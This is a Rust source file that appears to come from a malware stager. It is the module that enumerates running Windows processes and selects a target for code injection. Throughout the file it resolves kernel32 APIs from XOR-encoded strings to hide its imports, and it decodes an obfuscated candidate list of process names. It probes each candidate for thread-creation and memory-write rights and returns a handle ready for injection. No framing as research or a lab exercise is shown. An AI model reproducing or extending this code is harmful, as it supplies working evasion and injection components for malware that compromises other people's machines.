// enum_procs.rs — Process enumeration + injection target selection.
//
// Walks CreateToolhelp32Snapshot + Process32FirstW/NextW, scoring each
// running process against the XOR-encoded candidate list baked into the
// stager config. For each candidate, we require:
//
//   - Same session ID as the current process (ProcessIdToSessionId)
//   - x64 target (IsWow64Process returns FALSE)
//   - OpenProcess with PROCESS_CREATE_THREAD|VM_OPERATION|VM_WRITE|VM_READ
//     succeeds (we close the handle immediately — this is a probe)
//
// Priority is determined by the *order* of the candidate list: the first
// matching candidate whose process exists & is injectable wins.

use core::ffi::c_void;
use core::sync::atomic::AtomicPtr;

use crate::resolver::{resolve_cached, xor_const, ENC_KERNEL32};

// ── Win32 types ─────────────────────────────────────────────────────────────
#[repr(C)]
#[derive(Clone, Copy)]
pub struct ProcessEntry32W {
    pub dw_size:                u32,
    pub cnt_usage:              u32,
    pub th32_process_id:        u32,
    pub th32_default_heap_id:   usize,
    pub th32_module_id:         u32,
    pub cnt_threads:            u32,
    pub th32_parent_process_id: u32,
    pub pc_pri_class_base:      i32,
    pub dw_flags:               u32,
    pub sz_exe_file:            [u16; 260],
}

impl ProcessEntry32W {
    pub fn zero() -> Self { unsafe { core::mem::zeroed() } }
}

const INVALID_HANDLE: *mut c_void = -1isize as *mut c_void;
const TH32CS_SNAPPROCESS: u32 = 0x0000_0002;

// PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
pub const PROBE_ACCESS: u32 = 0x0002 | 0x0008 | 0x0010 | 0x0020 | 0x0400;

// ── Function pointer types ──────────────────────────────────────────────────
type FnSnapshot          = unsafe extern "system" fn(u32, u32) -> *mut c_void;
type FnProc32FirstW      = unsafe extern "system" fn(*mut c_void, *mut ProcessEntry32W) -> i32;
type FnProc32NextW       = unsafe extern "system" fn(*mut c_void, *mut ProcessEntry32W) -> i32;
type FnCloseHandle       = unsafe extern "system" fn(*mut c_void) -> i32;
type FnOpenProcess       = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type FnPidToSessionId    = unsafe extern "system" fn(u32, *mut u32) -> i32;
type FnIsWow64Process    = unsafe extern "system" fn(*mut c_void, *mut i32) -> i32;
type FnGetCurrentPid     = unsafe extern "system" fn() -> u32;

// ── Slots ───────────────────────────────────────────────────────────────────
static SLOT_SNAP:    AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_FIRST:   AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_NEXT:    AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_CLOSE:   AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_OPEN:    AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_SESSION: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_WOW:     AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_CURPID:  AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

const ENC_SNAP:    [u8; 24] = xor_const(*b"CreateToolhelp32Snapshot");
const ENC_FIRST:   [u8; 16] = xor_const(*b"Process32FirstW\0");
const ENC_NEXT:    [u8; 15] = xor_const(*b"Process32NextW\0");
const ENC_CLOSE:   [u8; 12] = xor_const(*b"CloseHandle\0");
const ENC_OPEN:    [u8; 12] = xor_const(*b"OpenProcess\0");
const ENC_SESSION: [u8; 20] = xor_const(*b"ProcessIdToSessionId");
const ENC_WOW:     [u8; 15] = xor_const(*b"IsWow64Process\0");
const ENC_CURPID:  [u8; 20] = xor_const(*b"GetCurrentProcessId\0");

#[inline] unsafe fn p_snap()    -> Option<FnSnapshot>       {
    let p = resolve_cached(&SLOT_SNAP, &ENC_KERNEL32, &ENC_SNAP);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_first()   -> Option<FnProc32FirstW>   {
    let p = resolve_cached(&SLOT_FIRST, &ENC_KERNEL32, &ENC_FIRST);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_next()    -> Option<FnProc32NextW>    {
    let p = resolve_cached(&SLOT_NEXT, &ENC_KERNEL32, &ENC_NEXT);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_close()   -> Option<FnCloseHandle>    {
    let p = resolve_cached(&SLOT_CLOSE, &ENC_KERNEL32, &ENC_CLOSE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_open()    -> Option<FnOpenProcess>    {
    let p = resolve_cached(&SLOT_OPEN, &ENC_KERNEL32, &ENC_OPEN);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_session() -> Option<FnPidToSessionId> {
    let p = resolve_cached(&SLOT_SESSION, &ENC_KERNEL32, &ENC_SESSION);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_wow()     -> Option<FnIsWow64Process> {
    let p = resolve_cached(&SLOT_WOW, &ENC_KERNEL32, &ENC_WOW);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn p_curpid()  -> Option<FnGetCurrentPid>  {
    let p = resolve_cached(&SLOT_CURPID, &ENC_KERNEL32, &ENC_CURPID);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}

// ── Helpers ─────────────────────────────────────────────────────────────────

/// Case-insensitive ASCII compare of a UTF-16 wide name (terminated by NUL)
/// against an ASCII candidate byte slice (not NUL-terminated).
fn wide_eq_ascii_ci(w: &[u16], ascii: &[u8]) -> bool {
    let wlen = w.iter().position(|&c| c == 0).unwrap_or(w.len());
    if wlen != ascii.len() { return false; }
    for i in 0..wlen {
        let c = w[i];
        if c > 0x7F { return false; }
        let wl = if (b'A' as u16..=b'Z' as u16).contains(&c) { c + 0x20 } else { c };
        let a  = ascii[i];
        let al = if (b'A'..=b'Z').contains(&a) { a + 0x20 } else { a };
        if wl != al as u16 { return false; }
    }
    true
}

/// Iterate XOR-encoded candidate blob, yielding one name at a time into
/// `scratch`. Returns `None` when the list is exhausted (double-NUL).
/// Format: null-separated, double-null terminated, XOR(0x37) encoded.
fn next_candidate<'a>(blob: &[u8], pos: &mut usize, scratch: &'a mut [u8]) -> Option<&'a [u8]> {
    if *pos >= blob.len() { return None; }
    let first = blob[*pos] ^ 0x37;
    if first == 0 { return None; } // double-null terminator reached
    let mut n = 0;
    while *pos < blob.len() && n < scratch.len() {
        let b = blob[*pos] ^ 0x37;
        *pos += 1;
        if b == 0 { break; }
        scratch[n] = b;
        n += 1;
    }
    Some(&scratch[..n])
}

// ── Target selection ────────────────────────────────────────────────────────

/// Pick an injection target by walking the process list and scoring each
/// process against the candidate list (priority = candidate index).
/// Returns the PID of the best target, or None.
pub unsafe fn pick_target(candidate_blob: &[u8]) -> Option<u32> {
    let snap_f   = p_snap()?;
    let first_f  = p_first()?;
    let next_f   = p_next()?;
    let close_f  = p_close()?;
    let open_f   = p_open()?;
    let sess_f   = p_session()?;
    let wow_f    = p_wow()?;
    let curpid_f = p_curpid()?;

    // Current session — we only inject same-session processes.
    let self_pid = curpid_f();
    let mut self_session: u32 = 0;
    if sess_f(self_pid, &mut self_session) == 0 { return None; }

    let h_snap = snap_f(TH32CS_SNAPPROCESS, 0);
    if h_snap.is_null() || h_snap == INVALID_HANDLE { return None; }

    let mut best_pid: u32 = 0;
    let mut best_rank: i32 = i32::MAX;

    let mut pe = ProcessEntry32W::zero();
    pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
    if first_f(h_snap, &mut pe) != 0 {
        loop {
            // Score against candidate list.
            let mut pos = 0usize;
            let mut rank = 0i32;
            let mut scratch: [u8; 64] = [0; 64];
            loop {
                // next_candidate advances pos
                let name = match next_candidate(candidate_blob, &mut pos, &mut scratch) {
                    Some(n) => n,
                    None => break,
                };
                if wide_eq_ascii_ci(&pe.sz_exe_file, name) {
                    if rank < best_rank && pe.th32_process_id != self_pid {
                        // Validate session, arch, and injectability.
                        if is_injectable(&pe, self_session, sess_f, wow_f, open_f, close_f) {
                            best_rank = rank;
                            best_pid  = pe.th32_process_id;
                        }
                    }
                    break;
                }
                rank += 1;
            }

            let mut next = ProcessEntry32W::zero();
            next.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
            if next_f(h_snap, &mut next) == 0 { break; }
            pe = next;
        }
    }

    let _ = close_f(h_snap);
    if best_rank != i32::MAX { Some(best_pid) } else { None }
}

unsafe fn is_injectable(
    pe: &ProcessEntry32W,
    self_session: u32,
    sess_f: FnPidToSessionId,
    wow_f: FnIsWow64Process,
    open_f: FnOpenProcess,
    close_f: FnCloseHandle,
) -> bool {
    let mut sess: u32 = 0;
    if sess_f(pe.th32_process_id, &mut sess) == 0 || sess != self_session { return false; }

    let h = open_f(PROBE_ACCESS, 0, pe.th32_process_id);
    if h.is_null() { return false; }

    let mut is_wow: i32 = 0;
    let wow_ok = wow_f(h, &mut is_wow) != 0 && is_wow == 0;

    let _ = close_f(h);
    wow_ok
}

/// Open a process for injection. Caller is responsible for closing via
/// `close_handle` below.
pub unsafe fn open_for_inject(pid: u32) -> Option<*mut c_void> {
    let open_f = p_open()?;
    let h = open_f(PROBE_ACCESS, 0, pid);
    if h.is_null() { None } else { Some(h) }
}

pub unsafe fn close_handle(h: *mut c_void) {
    if let Some(f) = p_close() { let _ = f(h); }
}
